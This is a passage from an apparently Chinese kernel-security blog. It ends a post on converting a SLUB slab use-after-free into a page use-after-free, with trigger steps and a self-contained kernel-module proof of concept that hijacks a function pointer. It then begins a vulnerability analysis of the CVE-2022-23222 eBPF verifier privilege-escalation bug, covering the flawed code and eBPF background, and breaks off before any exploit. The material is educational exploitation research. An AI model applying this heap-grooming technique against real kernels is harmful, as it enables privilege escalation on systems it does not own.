<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #define slub_cpu_partial(s) ((s)-&gt;cpu_partial)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_cpu_partial</span><span class="params">(struct kmem_cache *s, struct page *page, <span class="keyword">int</span> drain)</span></span></span><br><span class="line">...</span><br><span class="line">	oldpage = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line">	pobjects = oldpage-&gt;pobjects;</span><br><span class="line">	**<span class="keyword">if</span> (drain &amp;&amp; pobjects &gt; slub_cpu_partial(s)) &#123;**</span><br><span class="line">		...</span><br><span class="line">		unfreeze_partials(s, this_cpu_ptr(s-&gt;cpu_slab));</span><br></pre></td></tr></table></figure>

<p><strong>条件三:</strong></p>
<p>object 所在 page 位于 <code>freelist</code> 且 <code>page.inuse</code>为 0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unfreeze_partials</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">        struct kmem_cache_cpu *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">		<span class="keyword">while</span> ((page = slub_percpu_partial(c))) &#123;</span><br><span class="line">...</span><br><span class="line">				**<span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial)) &#123;**</span><br><span class="line">            page-&gt;next = discard_page;</span><br><span class="line">            **discard_page = page;**</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">...</span><br><span class="line">		<span class="keyword">while</span> (discard_page) &#123;</span><br><span class="line">        page = discard_page;</span><br><span class="line">        discard_page = discard_page-&gt;next;</span><br><span class="line"></span><br><span class="line">        stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">        **discard_slab(s, page);**</span><br><span class="line">        stat(s, FREE_SLAB);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>触发方法:</strong></p>
<ul>
<li>创建一批 objects 占满 cpu_partial + 2 个 pages, 保证 free 的时候 <code>page-&gt;pobjects &gt; (s)-&gt;cpu_partial</code></li>
<li>创建 objects 占据一个新的 page ，但不占满，保证 <code>c-&gt;page</code> 指向这个 page</li>
<li>free 掉一个 page 的所有 objects, 使这个 page 的 <code>page.inuse == 0</code></li>
<li>剩下的每个 page free 一个 object 用完 partial list 后就会 free 掉目标 page</li>
</ul>
<p>代码如下: </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 通过 free slab objects free 掉一个 page, 然后 UAF 利用</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">➜  ~ uname -r</span></span><br><span class="line"><span class="comment">5.10.90</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slub_def.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJ_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJ_NUM (16 * 16)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> data[OBJ_SIZE];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="keyword">void</span> (*func)(<span class="keyword">void</span>);</span><br><span class="line">            <span class="keyword">char</span> paddings[OBJ_SIZE - <span class="number">8</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; __attribute__((aligned(OBJ_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">my_cachep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> **<span class="title">tmp_ms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">ms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">random_ms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">target</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello_func</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    pr_info(<span class="string">"Hello\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hack_func</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    pr_info(<span class="string">"Hacked\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">km_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OO_SHIFT    16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OO_MASK     ((1 &lt;&lt; OO_SHIFT) - 1)</span></span><br><span class="line">    <span class="keyword">int</span> i, cpu_partial, objs_per_slab;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">target</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">realloc</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">    tmp_ms = kmalloc(OBJ_NUM * <span class="number">8</span>, GFP_KERNEL);</span><br><span class="line">    my_cachep = kmem_cache_create(<span class="string">"my_struct"</span>, <span class="keyword">sizeof</span>(struct my_struct), <span class="number">0</span>,</span><br><span class="line">    SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">"%s\n"</span>, my_cachep-&gt;name);</span><br><span class="line">    pr_info(<span class="string">"cpu_partial: %d\n"</span>, my_cachep-&gt;cpu_partial);</span><br><span class="line">    pr_info(<span class="string">"objs_per_slab: %u\n"</span>, my_cachep-&gt;oo.x &amp; OO_MASK);</span><br><span class="line">    pr_info(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">    cpu_partial = my_cachep-&gt;cpu_partial;</span><br><span class="line">    objs_per_slab = my_cachep-&gt;oo.x &amp; OO_MASK;</span><br><span class="line"></span><br><span class="line">    random_ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 16 * 14</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (objs_per_slab * (cpu_partial + <span class="number">1</span>)); i++)&#123;</span><br><span class="line">        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 15</span></span><br><span class="line">    <span class="keyword">for</span>(i = (objs_per_slab * (cpu_partial + <span class="number">1</span>));</span><br><span class="line">            i &lt; objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free normal object</span></span><br><span class="line">    ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    target = virt_to_page(ms);</span><br><span class="line">    pr_info(<span class="string">"target page: %px\n"</span>, target);</span><br><span class="line">    ms-&gt;func = (<span class="keyword">void</span> *)hello_func;</span><br><span class="line">    ms-&gt;func();</span><br><span class="line">    kmem_cache_free(my_cachep, ms);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 17</span></span><br><span class="line">    <span class="keyword">for</span>(i = objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">            i &lt; objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span> + (objs_per_slab + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// free page</span></span><br><span class="line">    <span class="keyword">for</span>(i = (objs_per_slab * (cpu_partial + <span class="number">1</span>));</span><br><span class="line">            i &lt; objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">        kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">        tmp_ms[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">            i &lt; objs_per_slab * (cpu_partial + <span class="number">2</span>) - <span class="number">1</span> + (objs_per_slab + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">        tmp_ms[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (objs_per_slab * (cpu_partial + <span class="number">1</span>)); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % objs_per_slab == <span class="number">0</span>)&#123;</span><br><span class="line">            kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">            tmp_ms[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// in other evil task</span></span><br><span class="line">    <span class="built_in">realloc</span> = alloc_page(GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">realloc</span> == target)&#123;</span><br><span class="line">        pr_info(<span class="string">"[+] Realloc success!!!\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	p = page_address(<span class="built_in">realloc</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt; PAGE_SIZE/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        ((<span class="keyword">void</span> **)p)[i] = (<span class="keyword">void</span> *)hack_func;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// UAF</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    ms-&gt;func();</span><br><span class="line"></span><br><span class="line">    free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">km_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; OBJ_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp_ms[i])</span><br><span class="line">            kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    kmem_cache_free(my_cachep, random_ms);</span><br><span class="line">    kmem_cache_destroy(my_cachep);</span><br><span class="line">    kfree(tmp_ms);</span><br><span class="line">    pr_info(<span class="string">"Bye\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module_init(km_init);</span><br><span class="line">module_exit(km_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"X++D"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Kernel xxx Module."</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2023/02/01/slabUaf-to-pageUaf/" data-id="cmd5slr2l000n0lo1flr2fegh" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2022/07/04/CVE-2022-23222" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2022/07/04/CVE-2022-23222/" class="article-date">
  <time datetime="2022-07-04T14:00:00.000Z" itemprop="datePublished">2022-07-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2022/07/04/CVE-2022-23222/">CVE-2022-23222  eBPF verifier 提权漏洞利用分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2022-23222-漏洞分析"><a href="#CVE-2022-23222-漏洞分析" class="headerlink" title="CVE-2022-23222 漏洞分析"></a>CVE-2022-23222 漏洞分析</h1><p>author: moxingyuan from iceswordlab</p>
<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>CVE-2022-23222 是一个 Linux 内核漏洞，其成因为 eBPF verifier 未阻止某些 *OR_NULL 类型指针的算数加减运算。利用该漏洞可导致权限提升。</p>
<p>受该漏洞影响的内核版本范围为 5.8 - 5.16 。</p>
<p>该漏洞分别在内核版本 5.10.92、5.15.15、5.16.1 中被修复，其中，5.10.92 版本修复该漏洞的 commit 为 [35ab8c9085b0af847df7fac9571ccd26d9f0f513](<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=35ab8c9085b0af847df7fac9571ccd26d9f0f513" target="_blank" rel="noopener">kernel/git/stable/linux.git - Linux kernel stable tree</a>) 。</p>
<h2 id="二、漏洞成因"><a href="#二、漏洞成因" class="headerlink" title="二、漏洞成因"></a>二、漏洞成因</h2><p>漏洞形成于 kernel/bpf/verifier.c 的 adjust_ptr_min_max_vals 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_ptr_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">				   struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *ptr_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">const</span> struct bpf_reg_state *off_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (ptr_reg-&gt;type) &#123;</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_MAP_VALUE_OR_NULL:</span><br><span class="line">		verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited, null-check it first\n"</span>,</span><br><span class="line">			dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	<span class="keyword">case</span> CONST_PTR_TO_MAP:</span><br><span class="line">		<span class="comment">/* smin_val represents the known value */</span></span><br><span class="line">		<span class="keyword">if</span> (known &amp;&amp; smin_val == <span class="number">0</span> &amp;&amp; opcode == BPF_ADD)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		fallthrough;</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_PACKET_END:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCKET:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCKET_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCK_COMMON:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_SOCK_COMMON_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_TCP_SOCK:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_TCP_SOCK_OR_NULL:</span><br><span class="line">	<span class="keyword">case</span> PTR_TO_XDP_SOCK:</span><br><span class="line">		verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited\n"</span>,</span><br><span class="line">			dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在禁止特定指针类型的算数加减运算时，没有列举完所有的 *OR_NULL 类型指针，导致部分 *OR_NULL 类型指针可以进行非法运算。</p>
<p>所有的 *OR_NULL 类型指针可以在枚举类型 bpf_reg_type 中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_reg_type &#123;</span><br><span class="line">    NOT_INIT = <span class="number">0</span>,         <span class="comment">/* nothing was written into register */</span></span><br><span class="line">    SCALAR_VALUE,         <span class="comment">/* reg doesn't contain a valid pointer */</span></span><br><span class="line">    PTR_TO_CTX,           <span class="comment">/* reg points to bpf_context */</span></span><br><span class="line">    CONST_PTR_TO_MAP,     <span class="comment">/* reg points to struct bpf_map */</span></span><br><span class="line">    PTR_TO_MAP_VALUE,     <span class="comment">/* reg points to map element value */</span></span><br><span class="line">    PTR_TO_MAP_VALUE_OR_NULL,  <span class="comment">/* points to map elem value or NULL */</span></span><br><span class="line">    PTR_TO_STACK,         <span class="comment">/* reg == frame_pointer + offset */</span></span><br><span class="line">    PTR_TO_PACKET_META,   <span class="comment">/* skb-&gt;data - meta_len */</span></span><br><span class="line">    PTR_TO_PACKET,        <span class="comment">/* reg points to skb-&gt;data */</span></span><br><span class="line">    PTR_TO_PACKET_END,    <span class="comment">/* skb-&gt;data + headlen */</span></span><br><span class="line">    PTR_TO_FLOW_KEYS,     <span class="comment">/* reg points to bpf_flow_keys */</span></span><br><span class="line">    PTR_TO_SOCKET,        <span class="comment">/* reg points to struct bpf_sock */</span></span><br><span class="line">    PTR_TO_SOCKET_OR_NULL,      <span class="comment">/* reg points to struct bpf_sock or NULL */</span></span><br><span class="line">    PTR_TO_SOCK_COMMON,   <span class="comment">/* reg points to sock_common */</span></span><br><span class="line">    PTR_TO_SOCK_COMMON_OR_NULL, <span class="comment">/* reg points to sock_common or NULL */</span></span><br><span class="line">    PTR_TO_TCP_SOCK,      <span class="comment">/* reg points to struct tcp_sock */</span></span><br><span class="line">    PTR_TO_TCP_SOCK_OR_NULL,    <span class="comment">/* reg points to struct tcp_sock or NULL */</span></span><br><span class="line">    PTR_TO_TP_BUFFER,     <span class="comment">/* reg points to a writable raw tp's buffer */</span></span><br><span class="line">    PTR_TO_XDP_SOCK,      <span class="comment">/* reg points to struct xdp_sock */</span></span><br><span class="line">    <span class="comment">/* PTR_TO_BTF_ID points to a kernel struct that does not need</span></span><br><span class="line"><span class="comment">     * to be null checked by the BPF program. This does not imply the</span></span><br><span class="line"><span class="comment">     * pointer is _not_ null and in practice this can easily be a null</span></span><br><span class="line"><span class="comment">     * pointer when reading pointer chains. The assumption is program</span></span><br><span class="line"><span class="comment">     * context will handle null pointer dereference typically via fault</span></span><br><span class="line"><span class="comment">     * handling. The verifier must keep this in mind and can make no</span></span><br><span class="line"><span class="comment">     * assumptions about null or non-null when doing branch analysis.</span></span><br><span class="line"><span class="comment">     * Further, when passed into helpers the helpers can not, without</span></span><br><span class="line"><span class="comment">     * additional context, assume the value is non-null.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PTR_TO_BTF_ID,</span><br><span class="line">    <span class="comment">/* PTR_TO_BTF_ID_OR_NULL points to a kernel struct that has not</span></span><br><span class="line"><span class="comment">     * been checked for null. Used primarily to inform the verifier</span></span><br><span class="line"><span class="comment">     * an explicit null check is required for this struct.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PTR_TO_BTF_ID_OR_NULL,</span><br><span class="line">    PTR_TO_MEM,           <span class="comment">/* reg points to valid memory region */</span></span><br><span class="line">    PTR_TO_MEM_OR_NULL,   <span class="comment">/* reg points to valid memory region or NULL */</span></span><br><span class="line">    PTR_TO_RDONLY_BUF,    <span class="comment">/* reg points to a readonly buffer */</span></span><br><span class="line">    PTR_TO_RDONLY_BUF_OR_NULL,  <span class="comment">/* reg points to a readonly buffer or NULL */</span></span><br><span class="line">    PTR_TO_RDWR_BUF,      <span class="comment">/* reg points to a read/write buffer */</span></span><br><span class="line">    PTR_TO_RDWR_BUF_OR_NULL,    <span class="comment">/* reg points to a read/write buffer or NULL */</span></span><br><span class="line">    PTR_TO_PERCPU_BTF_ID,       <span class="comment">/* reg points to a percpu kernel variable */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可发现漏掉的指针类型包括：</p>
<ul>
<li>PTR_TO_BTF_ID_OR_NULL</li>
<li>PTR_TO_MEM_OR_NULL</li>
<li>PTR_TO_RDONLY_BUF_OR_NULL</li>
<li>PTR_TO_RDWR_BUF_OR_NULL</li>
</ul>
<h2 id="三、漏洞相关知识"><a href="#三、漏洞相关知识" class="headerlink" title="三、漏洞相关知识"></a>三、漏洞相关知识</h2><p>eBPF (Extended Berkeley Packet Filter) 由 cBPF (Classic Berkeley Packet Filter) 衍生而来，是一项可在内核虚拟机中运行程序的技术。使用eBPF无需修改内核源码，或者插入驱动，对系统的入侵性相对没那么强，可以安全并有效地扩展内核的功能。</p>
<h3 id="3-1-eBPF指令"><a href="#3-1-eBPF指令" class="headerlink" title="3.1 eBPF指令"></a>3.1 eBPF指令</h3><p>eBPF 使用类似 x86 的虚拟机指令，基础指令为 8 字节，其编码格式为：</p>
<table>
<thead>
<tr>
<th align="center">32 bits (MSB)</th>
<th align="center">16 bits</th>
<th align="center">4 bits</th>
<th align="center">4 bits</th>
<th align="center">8 bits (LSB)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">immediate</td>
<td align="center">offset</td>
<td align="center">source register</td>
<td align="center">destination register</td>
<td align="center">opcode</td>
</tr>
</tbody></table>
<p>扩展指令在基础指令基础上增加 8 个字节的立即数，总长度为 16 字节。</p>
